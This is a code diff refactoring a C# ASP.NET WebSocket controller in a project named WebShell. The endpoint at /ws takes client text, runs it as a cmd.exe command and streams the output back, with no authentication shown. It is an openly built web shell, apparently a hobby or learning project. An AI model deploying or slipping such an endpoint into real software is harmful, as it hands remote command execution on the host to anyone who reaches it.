@@ -1,13 +1,14 @@
-﻿using System.Diagnostics;
+﻿using System.Net.WebSockets;
 using System.Text;
 using Microsoft.AspNetCore.Mvc;
-using System.Net.WebSockets;
-using WebShell.Helpers;
 
 namespace WebShell.Controllers;
 
 public class WebSocketController : ControllerBase
 {
+    private static WebSocketReceiveResult _receiveResult = null!;
+    private static byte[] _buffer = new byte[1024 * 4];
+
     [Route("/ws")]
     public async Task Get()
     {
@@ -22,86 +23,70 @@ public class WebSocketController : ControllerBase
         }
     }
 
-
     private static async Task Echo(WebSocket webSocket)
     {
         Console.WriteLine("BEGIN ECHO");
+        /* PENDING RECEIVE */
 
-        var buffer = new byte[1024 * 4];
-        var receiveResult = await webSocket.ReceiveAsync(
-            new ArraySegment<byte>(buffer), CancellationToken.None);
+        _receiveResult = await WS_RECEIVE(webSocket);
+
         Console.WriteLine("RECEIVE WS <-");
 
-
-        Console.WriteLine("CLOSE STATUS : " + !receiveResult.CloseStatus.HasValue);
-
-        while (!receiveResult.CloseStatus.HasValue)
+        /* CONNECT */
+        while (!_receiveResult.CloseStatus.HasValue)
         {
-            var shell = new Process();
-
-            shell.StartInfo = new ProcessStartInfo()
-            {
-                FileName = "cmd.exe",
-                UseShellExecute = false,
-                CreateNoWindow = true,
-                RedirectStandardInput = true,
-                RedirectStandardOutput = true,
-                RedirectStandardError = true,
-            };
-
-            shell.Start();
-            shell.BeginErrorReadLine();
-            shell.BeginOutputReadLine();
-
-
             var result = "";
-            var output = "";
-            /* Code for send */
-            var command = Encoding.UTF8.GetString(buffer, 0, receiveResult.Count);
+            var command = Encoding.UTF8.GetString(_buffer, 0, _receiveResult.Count);
 
             Console.WriteLine($"SERVER COMMAND : {command}");
+
+            WebShell.CommandRequest(command);
+            WebShell.CmdProcess.OutputDataReceived += (s, e) =>
+            {
+                // TODO Handle Ctrl+C for cancel process
+                if (e.Data == null) return;
+                result = e.Data + "\n";
+                Console.WriteLine("WS_SEND ->");
+                WS_SEND(webSocket, result);
+            };
+            WebShell.CmdProcess.ErrorDataReceived += (s, e) =>
+            {
+                if (e.Data == null) return;
+                result = e.Data + "\n";
+                WS_SEND(webSocket, result);
+            };
+            WebShell.Run();
             
-            try
-            {
-                shell.StandardInput.WriteLine(command);
-
-                shell.OutputDataReceived += (sender, e) => { result += e.Data + "\n"; };
-                shell.ErrorDataReceived += (sender, e) => { result += e.Data + "\n"; };
-
-                shell.StandardInput.WriteLine("exit");
-                shell.WaitForExit();
-            }
-            catch (Exception ex)
-            {
-                Console.WriteLine(ex.ToString());
-            }
-
-            Console.WriteLine($"RESULT: {result.Length}");
-
-            output = new SplitResult().GetOutput(result);
-            var mess = Encoding.UTF8.GetBytes(output);
-
-            Console.WriteLine($"OUTPUT: {output.Length}");
-
-            await webSocket.SendAsync(
-                new ArraySegment<byte>(mess, 0, mess.Length),
-                receiveResult.MessageType,
-                receiveResult.EndOfMessage,
-                CancellationToken.None);
-
-            Console.WriteLine("SEND TO CLIENT ->");
-
-            receiveResult = await webSocket.ReceiveAsync(
-                new ArraySegment<byte>(buffer), CancellationToken.None);
+            _receiveResult = await WS_RECEIVE(webSocket);
             Console.WriteLine("RECEIVE WS <-");
         }
 
-        Console.WriteLine("AFTER WHILE");
+        /* CLOSE */
+        WS_CLOSE(webSocket);
+        Console.WriteLine("CLOSE");
+    }
 
+    private static async Task<WebSocketReceiveResult> WS_RECEIVE(WebSocket webSocket)
+    {
+        return await webSocket.ReceiveAsync(
+            new ArraySegment<byte>(_buffer), CancellationToken.None);
+    }
+    private static async void WS_SEND(WebSocket webSocket, string output)
+    {
+        var mess = Encoding.UTF8.GetBytes(output);
 
-        await webSocket.CloseAsync(
-            receiveResult.CloseStatus.Value,
-            receiveResult.CloseStatusDescription,
+        await webSocket.SendAsync(
+            new ArraySegment<byte>(mess, 0, mess.Length),
+            _receiveResult.MessageType,
+            _receiveResult.EndOfMessage,
             CancellationToken.None);
+    }
+    private static async void WS_CLOSE(WebSocket webSocket)
+    {
+        if (_receiveResult.CloseStatus != null)
+            await webSocket.CloseAsync(
+                _receiveResult.CloseStatus.Value,
+                _receiveResult.CloseStatusDescription,
+                CancellationToken.None);
     }
 }
